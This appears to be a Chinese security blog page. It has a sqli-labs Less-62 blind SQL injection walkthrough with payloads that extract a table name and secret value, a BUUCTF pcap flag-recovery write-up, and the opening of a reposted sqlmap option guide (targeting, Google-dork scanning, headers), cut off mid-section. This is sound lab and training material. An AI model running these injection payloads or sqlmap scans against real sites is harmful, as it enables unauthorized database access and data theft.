title="Less-62-盲注-‘)"></a>Less-62-盲注-‘)</h4><p>此处union和报错注入都已经失效了，那我们就要使用盲注了。</p><ul><li>爆当前数据库的长度:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and length(database())&gt;8 #   正确 <br>?id=1&#x27;) and length(database())&gt;9 #   正确 <br>?id=1&#x27;) and length(database())&gt;10 #  错误 <br>?id=1&#x27;) and length(database())=10 #  正确 <br></code></pre></td></tr></table></figure><p>得数据库长度为 10</p><ul><li>爆数据库的每一位字符:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid(database(),1,1))=99 #<br></code></pre></td></tr></table></figure><ul><li>爆当前数据库所有表的个数:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and (select count(table_name) from information_schema.tables where table_schema=database())=1 #<br></code></pre></td></tr></table></figure><ul><li>第一个表的长度:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 #<br></code></pre></td></tr></table></figure><ul><li>第一个表的每一个字符:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=78 #<br></code></pre></td></tr></table></figure><p>得到表名为: N18FOKJDNC</p><ul><li>爆第一个字段名的长度:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and length((select column_name from information_schema.columns where table_name=&#x27;N18FOKJDNC&#x27; limit 0,1))=2 #<br></code></pre></td></tr></table></figure><ul><li>爆第一个字段名的每一个字符:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid((select column_name from information_schema.columns where table_name=&#x27;N18FOKJDNC&#x27; limit 0,1),1,1))=105 #<br></code></pre></td></tr></table></figure><p>最后得第一个字段名为: id</p><p>然后依次爆得第二、三、四个字段名分别为: sessid,secret_BDFP, tryy</p><ul><li>爆secret_BDFP字段值的长度:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and (select length(secret_BDFP) from N18FOKJDNC)=24 #<br></code></pre></td></tr></table></figure><ul><li>爆每一个值:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) and ascii(mid((select secret_BDFP from N18FOKJDNC),1,1))=113 #<br></code></pre></td></tr></table></figure><p>最后得值为: <strong>qAAMVVGX0thxbmsazGMxOlFe</strong></p><h4 id="Less-63-盲注-‘"><a href="#Less-63-盲注-‘" class="headerlink" title="Less-63-盲注-‘"></a>Less-63-盲注-‘</h4><p>注入点改变，其他于Less-62一样</p><h4 id="Less-64-盲注-数字"><a href="#Less-64-盲注-数字" class="headerlink" title="Less-64-盲注-数字"></a>Less-64-盲注-数字</h4><p>注入点改变，其他于Less-62一样</p><h4 id="Less-65-盲注-“"><a href="#Less-65-盲注-“" class="headerlink" title="Less-65-盲注-“"></a>Less-65-盲注-“</h4><p>注入点改变，其他于Less-62一样</p><p><a href="https://buuoj.cn/challenges#sqltest">BUUCTF在线评测sqltest</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016163.png"></p><p>得到一个.pcapng文件，双击在Wireshark中打开</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016097.png"></p><p>根据题目，这是sql攻击，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016229.png"></p><p>导出<code>http</code>对象并过滤<code>ascii</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016252.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016882.png"></p><p>布尔盲注一般用<code>substr()</code>切割每个字符串，并一个一个地用<code>ascii()</code>转成ASCII码来判断，以爆出真正的数据，但是<code>substr()</code>也用于判断表名、字段名的长度，所以这里直接过滤<code>ascii</code>，方便之后的分析</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017978.png"></p><p>这里的780和848俩个字节，是HTTP请求内容的实际数据长度（即服务器接收或发送的HTTP协议载荷大小）</p><p>780可能是没有成功的，<code>&gt;101</code>返回true（848），<code>&gt;102</code>返回false（780），说明第一个字符的ASCII码为<code>101</code></p><p>所以每次找最后一个就对了：</p><p><code>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125 </code></p><p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>下载和安装：</p><p><a href="https://sqlmap.org/">sqlmap：自动 SQL 注入和数据库接管工具</a></p><p>kali操作系统自带sqlmap，可以直接输入sqlmap执行。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017638.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017392.png"></p><h1 id="sqlmap命令详解"><a href="#sqlmap命令详解" class="headerlink" title="sqlmap命令详解"></a>sqlmap命令详解</h1><blockquote><p>转载自： <a href="https://cloud.tencent.com/developer/user/8223537">全栈程序员站长</a>      原文：<a href="https://cloud.tencent.com/developer/article/2148285">https://cloud.tencent.com/developer/article/2148285</a></p></blockquote><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x01 sqlmap 确定目标</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.1 直连数据库</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.2 URL探测</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.3 文件读取目标</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">1.4 Google 批量扫描注入</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x02 sqlmap 请求参数设置（一）</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.1 设置 HTTP 方法</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.2 设置 POST 提交参数</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.3 设置参数分割符</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.4 设置Cookie 头</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.5 设置 User-Agent 头</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.6 设置 Host 头</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.7 设置 Referer 头</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.8 设置 额外 HTTP 头</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.9 设置 HTTP 协议认证</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">2.10 设置 HTTP 代理</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x03 sqlmap 请求参数设置（二）</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.1 设置Tor隐藏网络</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.2 设置延时</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.3 设置超时</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.4 设置重传次数</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.5 设置随机化参数</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.6 设置日志过滤目标</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.7 设置忽略 401</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.8 设置 HTTP 协议私钥</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.9 设置安全模式</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">3.10 设置忽略URL编码</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x04 sqlmap 性能优化</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.1 设置持久 HTTP 连接</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.2 设置 HTTP 空连接</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.3 设置多线程</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">4.5 设置预测输出</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x05 sqlmap 注入位置介绍</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.0 注入介绍</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.1 设置指定注入参数</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.2 设置URL注入位置</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">5.3 设置任意注入位置</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x06 sqlmap 注入参数</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.1 强制设置 DBMS</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.2 强制设置 OS</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.3 关闭负载转换机制</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.4 关闭字符转义机制</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.5 强制设置无效值替换</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.6 自定义注入负载位置</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.7 设置 Tamper 脚本</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">6.8 设置 DBMS 认证</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x07 sqlmap 自定义检测参数</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.1 设置探测等级</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.2 设置风险参数</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.3 设置页面比较参数</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">7.4 设置内容比较参数</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x08 sqlmap 注入技术参数</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.1 设置具体 SQL 注入技术</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.2 设置时间盲注延迟时间</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.3 设置 UNION 字段数</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.4 设置 UNION 字符</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.5 设置 UNION 查询表</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.6 设置 DNS 露出攻击</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.7 设置二次注入</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">8.8 识别指纹</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x09 sqlmap 检索 DBMS 信息</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.1 检索 DBMS Banner 信息</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.2 检索 DBMS 当前用户</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.3 检索 DBMS 当前数据库</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">9.4 检索 DBMS 当前主机名</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0A sqlmap 枚举 DBMS 信息</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.1 探测当前用户 DBA</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.2 枚举 DBMS 用户</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.3 枚举 DBMS 用户密码</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.4 枚举 DBMS 权限</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.5 枚举数据库名</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.6 枚举数据库表</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.7 枚举数据库表的列名</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">10.8 枚举数据值</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0B sqlmap 枚举信息</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.1 枚举 schema 信息</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.2 枚举数据表数量</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.3 获取数据信息</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.4 设置条件获取信息</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.5 暴力激活成功教程数据</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.6 读取文件</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.7 写入文件</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">11.8 检索所有信息</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0C sqlmap 系统参数</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.1 执行系统命令</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.2 结合Metasploit</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.3 注册表介绍</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">12.4 注册表操作</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0D sqlmap 通用参数（一）</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.1 加载 sqlite 会话文件</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.2 加载 http 文本文件</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.3 设置默认选择选项</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.4 执行系统命令</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.5 设置盲注字符集</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.6 爬取 URL</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.7 在 CSV 输入中使用的分割字符</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.8 设置输出格式</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.9 探测之前检测 Internet 连接</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">13.10 解析和测试表单的输入字段</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0E sqlmap 通用参数（二）</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.1 设置预计完成时间</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.2 刷新会话文件</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.3 忽略会话中的存储结果</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.4 使用 Hex 函数检索数据</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.5 设置自定义输出路径</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.6 从响应页面解析错误</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.7 强制设置 DBMS 编码</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.8 存储 HTTP 流量到 HAR</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.9 筛选具体 Payload</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">14.10 过滤具体 Payload</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x0F sqlmap 杂项参数</a></li><li><ul><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.1 使用缩写助记符</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.2 设置探测预警</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.3 设置问题答案</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.4 发现 SQL 注入预警</a></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.5 其他</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x10 常用 Tamper 脚本</a></li></ul><h2 id="0x01-sqlmap-确定目标"><a href="#0x01-sqlmap-确定目标" class="headerlink" title="0x01 sqlmap 确定目标"></a>0x01 sqlmap 确定目标</h2><h3 id="1-1-直连数据库"><a href="#1-1-直连数据库" class="headerlink" title="1.1 直连数据库"></a>1.1 直连数据库</h3><p>sqlmap支持直接连接数据库，通过以下命令来直连</p><p>服务型数据库（前提知道数据库用户名和密码） DBMS:&#x2F;&#x2F;USER:PASSWORD@DBMS_PORT&#x2F;DATABASE_NAME （MySQL，Oracle，Microsoft SQL Server，PostgreSQL，etc）</p><p>例如： python sqlmap.py -d “mysql:&#x2F;&#x2F;admin:<a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#49;&#x2e;&#x32;">admin@192.168.1.2</a>:3306&#x2F;security” -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020546.png" alt="img"></p><p>文件型数据库（前提知道数据库的绝对路径） DBMS:&#x2F;&#x2F;DATABASE_FILEPATH (SQLite，Microsoft Access，Fire bird，etc)</p><h3 id="1-2-URL探测"><a href="#1-2-URL探测" class="headerlink" title="1.2 URL探测"></a>1.2 URL探测</h3><p>sqlmap直接对单一URL探测，使用参数 -u 或 –url URL格式：http(s): &#x2F;&#x2F;targeturl [:port] &#x2F;[…]</p><p>例如： python sqlmap.py -u <a href="http://www.target/vuln.php?id=1">http://www.target/vuln.php?id=1</a> –banner</p><h3 id="1-3-文件读取目标"><a href="#1-3-文件读取目标" class="headerlink" title="1.3 文件读取目标"></a>1.3 文件读取目标</h3><p>sqlmap支持从不同类型的文件中读取目标进行SQL注入探测 1、-l 从BurpSuite Proxy或从WebScarab Proxy中读取HTTP请求日志 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020148.png" alt="img"></p><p> 查看burpsuite抓取的日志信息 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020092.png" alt="img"></p><p> 使用sqlmap进行演示 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021326.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020052.png" alt="img"></p><p>2、-x 从sitemap.xml站点地图文件中读取目标探测</p><p>3、-m 从多行文本格式文件读取多个目标</p><p>4、-r 从文本文件中读取HTTP请求作为SQL注入探测目标 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021903.png" alt="img"></p><p> 将burp suite抓取的HTTP请求信息，复制到txt文件中，在使用sqlmap -r ‘txt文件’ 进行探测</p><p>5、-c 从配置文件 sqlmap.conf 中读取目标探测 查看sqlmap.conf 文件的内容 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021918.png" alt="img"></p><p> 将想要探测目标的url填入该文件中，里面也可以通过日志文件形式（相当于使用 -l 参数）、HTTP请求文件（相当于使用 -r 参数）进行探测，还可以设置其他参数，例如：method(HTTP请求方法)、data（指定POST提交的数据）等等</p><p>接下来，我们将目标url填入sqlmap.conf文件，进行演示 python sqlmap.py -c sqlmap.conf –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020660.png" alt="img"></p><h3 id="1-4-Google-批量扫描注入"><a href="#1-4-Google-批量扫描注入" class="headerlink" title="1.4 Google 批量扫描注入"></a>1.4 Google 批量扫描注入</h3><p>sqlmap通过 -g 自动利用Google获取指定Google hack的目标，然后利用交互向导模式进行SQL注入探测</p><p>例如： python sqlmap.py -g “inurl:.php?id&#x3D;” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020037.png" alt="img"></p><h2 id="0x02-sqlmap-请求参数设置（一）"><a href="#0x02-sqlmap-请求参数设置（一）" class="headerlink" title="0x02 sqlmap 请求参数设置（一）"></a>0x02 sqlmap 请求参数设置（一）</h2><h3 id="2-1-设置-HTTP-方法"><a href="#2-1-设置-HTTP-方法" class="headerlink" title="2.1 设置 HTTP 方法"></a>2.1 设置 HTTP 方法</h3><p>Sqlmap会自动在探测过程中使用适合的HTTP请求方法。但是在某些具体情况下，需要强制使用具体的HTTP请求方法。例如 PUT请求方法。HTTP PUT请求方法不会自动使用，因此需要我们强制指定。使用 –method&#x3D;PUT。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021919.png" alt="img"></p><p>例如： python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –method&#x3D;get –banner</p><h3 id="2-2-设置-POST-提交参数"><a href="#2-2-设置-POST-提交参数" class="headerlink" title="2.2 设置 POST 提交参数"></a>2.2 设置 POST 提交参数</h3><p>默认情况下，用于执行HTTP请求的HTTP方法是GET，但是您可以通过提供在POST请求中发送的数据隐式地将其更改为POST。这些数据作为这些参数，被用于SQL注入检测。 例如： python sqlmap.py -u “<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.php”</a> –data&#x3D;“id&#x3D;1” -f –banner –dbs –users</p><p>-f fingerprint 指纹</p><p>演示： python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/”</a> –data&#x3D;“uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit” -p uname -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020309.png" alt="img"></p><h3 id="2-3-设置参数分割符"><a href="#2-3-设置参数分割符" class="headerlink" title="2.3 设置参数分割符"></a>2.3 设置参数分割符</h3><p>在某些情况下，sqlmap需要覆盖默认参数分隔符(例如&amp; in GET和POST数据)，才能正确地分割和单独处理每个参数。</p><p>例如： python sqlmap.py -u “<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.php”</a> –data&#x3D;“query&#x3D;foobar;id&#x3D;1” –param-del&#x3D;”;” -f –banner –dbs –users</p><p>演示： python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/”</a> –data&#x3D;uname&#x3D;“admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit” –param-del&#x3D;”&amp;” -p uname -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020662.png" alt="img"></p><h3 id="2-4-设置Cookie-头"><a href="#2-4-设置Cookie-头" class="headerlink" title="2.4 设置Cookie 头"></a>2.4 设置Cookie 头</h3><p>Sqlmap中用来设置Cookie的参数：–cookie, –cookie-del, –load-cookies –drop-set-cookie </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021972.png" alt="img"></p><p>使用场景： 1、Web应用程序具有基于Cookie验证的过程； 2、想利用Cookie值上的SQL注入漏洞。</p><p>Sqlmap使用Cookie过程： 1、登录或浏览页面。 2、打开审计工具或代理截断，复制Cookie。 3、在Sqlmap中使用 –cookie 粘贴Cookie。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021255.png" alt="img"></p><p> python sqlmap.py -u “<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/”</a> –data&#x3D;“uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit” -p uname -f –banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020973.png" alt="img"></p><p>如果在通信过程中，web应用程序使用Set-Cookie标头进行响应，sqlmap将在所有进一步的HTTP请求中自动使用其值作为Cookie标头。sqlmap还将为SQL注入自动测试这些值。这可以通过提供–drop-set-cookie—sqlmap将忽略任何即将到来的Set-Cookie头来避免。 反之亦然，如果您提供了一个带有选项的HTTP Cookie报头—Cookie和目标URL在任何时候发送一个HTTP set -Cookie报头，sqlmap将询问您要为以下HTTP请求使用哪组Cookie。</p><p>load-cookie，可以用来提供包含Netscape&#x2F;wget格式的cookie的特殊文件</p><p>注意：如果需要对HTTP Cookie值进行SQL注入探测，需要设置 –level 2以上（3）。</p><h3 id="2-5-设置-User-Agent-头"><a href="#2-5-设置-User-Agent-头" class="headerlink" title="2.5 设置 User-Agent 头"></a>2.5 设置 User-Agent 头</h3><p>默认情况下， sqlmap使用以下用户代理头值执行HTTP请求: sqlmap&#x2F;1.0-dev-xxxxxxx (<a href="http://sqlmap.org/">http://sqlmap.org</a>) （使用Wireshark 抓包查看） </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020307.png" alt="img"></p><p> 然而， 通过提供自定义用户代理作为选项的参数， 可以使用选项—user-agent来伪造它。（可使用burpsuite抓取正常的HTTP请求包获取User-Agent头的信息）</p><p>sqlmap -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –user-agent ” Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0″ 再次抓包查看 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022685.png" alt="img"></p><p> 此外， 通过 –random-agent, sqlmap将从.&#x2F;txt&#x2F;user-agent中随机选择一个用于会话中的所有HTTP请求。一些站点在服务端检测HTTP User-Agent值， 如果不是一个合法的值， 就会中断连接。 同时Sqlmap也会曝出错误。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022826.png" alt="img"></p><p> 演示： sqlmap -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –random-agent 抓包查看 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020339.png" alt="img"></p><p>注意针对User-Agent的值探测SQL注入， 需要设置–level 值为3。或者，使用Burp Suite抓包，将HTTP请求信息复制到txt文件中，然后在要User-Agent头的后面加上一个 * 号，这样不使用—level 3 也能够对User-Agent头进行探测 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022473.png" alt="img"></p><h3 id="2-6-设置-Host-头"><a href="#2-6-设置-Host-头" class="headerlink" title="2.6 设置 Host 头"></a>2.6 设置 Host 头</h3><p>可以手动设置HTTP主机头值。 默认情况下， 从提供的目标URL解析HTTP主机头 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020559.png" alt="img"></p><p> 注意， 如果 –level设置为5,将对HTTP主机头进行SQL注入检测。</p><h3 id="2-7-设置-Referer-头"><a href="#2-7-设置-Referer-头" class="headerlink" title="2.7 设置 Referer 头"></a>2.7 设置 Referer 头</h3><p>伪造HTTP Referer值是可能的。 默认情况下， 如果没有显式设置， HTTP请求中不会发送HTTP引用头。 请注意， 如果–level设置为3或以上， 将针对HTTP引用头 进行SQL注入测试（或在请求信息中要进行探测的位置后面加上*号） </p><p><img 